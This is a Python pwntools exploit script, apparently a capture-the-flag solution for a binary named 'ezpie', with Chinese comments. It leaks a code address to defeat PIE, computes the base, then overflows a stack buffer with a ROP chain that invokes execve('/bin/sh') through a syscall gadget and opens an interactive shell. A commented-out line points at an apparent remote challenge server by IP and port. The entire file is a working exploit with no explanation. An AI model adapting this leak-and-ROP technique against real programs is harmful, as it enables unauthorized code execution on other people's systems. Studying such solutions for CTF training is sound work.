from pwn import*
context(arch='amd64', os='linux', log_level='debug')
p = process('./ezpie')
#p = remote('43.249.195.138', 20258)

# 泄露.text段地址
p.recvuntil('input your name-> \n')
payload = b'a' * 40
p.send(payload)
# 接收地址
p.recvuntil(b'a' * 40)
fun_addr=u64(p.recv()[:6].ljust(8, b'\x00'))
addr_base = fun_addr - 0x120E

# ROP链
binsh           = addr_base + 0x2008
syscall         = addr_base + 0x12c5
pop_rdi_ret     = addr_base + 0x1333
pop_rax_ret     = addr_base + 0x12c8
pop_rsi_r15_ret = addr_base + 0x1331

payload  = b'a' * (0x50 + 8)
payload += p64(pop_rax_ret) + p64(59) + p64(pop_rdi_ret) + p64(binsh) + p64(pop_rsi_r15_ret) + p64(0) + p64(0) + p64(syscall)
p.send(payload)
p.interactive()